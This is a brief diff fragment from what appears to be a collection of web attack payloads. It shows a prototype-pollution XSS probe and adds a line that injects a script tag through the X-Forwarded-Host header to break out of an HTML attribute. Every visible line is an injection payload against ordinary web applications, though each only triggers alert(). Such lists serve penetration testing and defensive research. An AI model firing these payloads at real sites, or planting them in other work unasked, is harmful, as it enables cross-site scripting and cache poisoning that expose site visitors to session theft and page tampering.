@@ -532,7 +532,7 @@ for old browsers
 /#__proto_[onload]=alert(11)
 
 
-
+x-forwarded-host: a."><script>alert(1)</script>"
 
 
 
